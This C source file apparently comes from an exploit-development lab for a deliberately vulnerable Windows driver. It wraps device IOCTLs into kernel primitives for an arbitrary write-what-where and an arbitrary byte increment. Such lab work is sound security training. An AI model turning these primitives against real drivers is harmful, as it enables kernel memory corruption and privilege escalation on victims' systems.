#include "Vulnerabilities.h"
#include "Vulnerable Driver Definitions.h"


void WriteWhatWhere(UINT64 what, UINT64 where);
void IncrementArbitraryByte(UINT64 byteAddress);

WRITE_WHAT_WHERE_VULNERABILITY VulnerableDriverWriteWhatWhere = &WriteWhatWhere;
INCREMENT_ARBITRARY_BYTE_VULNERABILITY VulnerableDriverIncrementArbitraryByte = &IncrementArbitraryByte;

void WriteWhatWhere(UINT64 what, UINT64 where) {
	HANDLE hDevice = NULL;
	ULONG nb = 0;
	PUINT64 input = NULL; //The input buffer sent in the IRP

	input = (PUINT64)malloc(8);

	hDevice = CreateFile(
		DOS_DEVICE_NAME,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open device %x\n", GetLastError());
		return;
	}

	*input = where;

	if (!
		DeviceIoControl(
		hDevice,
		IOCTL_UPDATE_WHERE,
		input,
		8,
		NULL,
		0,
		&nb,
		NULL)
		)
	{
		printf("Failed to send IOCTL %x\n", GetLastError());
		return;
	}

	*input = what;

	if (!
		DeviceIoControl(
		hDevice,
		IOCTL_UPDATE_WHAT,
		input,
		8,
		NULL,
		0,
		&nb,
		NULL)
		)
	{
		printf("Failed to send IOCTL %x\n", GetLastError());
		return;
	}

	if (!
		DeviceIoControl(
		hDevice,
		IOCTL_TRIGGER_WRITE_WHAT_WHERE_VULNERABILITY,
		NULL,
		0,
		NULL,
		0,
		&nb,
		NULL)
		)
	{
		printf("Failed to send IOCTL %x\n", GetLastError());
		return;
	}
}

void IncrementArbitraryByte(UINT64 byteAddress){
	HANDLE hDevice = NULL;
	ULONG nb = 0;
	PUINT64 input = NULL;

	input = (PUINT64)malloc(8);

	hDevice = CreateFile(
		DOS_DEVICE_NAME,
		GENERIC_WRITE | GENERIC_READ,
		0,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		NULL
		);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("Failed to open device %x\n", GetLastError());
		return;
	}

	*input = byteAddress;

	if (!
		DeviceIoControl(
			hDevice,
			IOCTL_UPDATE_BYTE_ADDRESS,
			input,
			8,
			NULL,
			0,
			&nb,
			NULL)
		)
	{
		printf("Failed to send IOCTL %x\n", GetLastError());
		return;
	}

	if (!
		DeviceIoControl(
			hDevice,
			IOCTL_TRIGGER_INCREMENT_ARBITRARY_BYTE_VULNERABILITY,
			NULL,
			0,
			NULL,
			0,
			&nb,
			NULL)
		)
	{
		printf("Failed to send IOCTL %x\n", GetLastError());
		return;
	}
}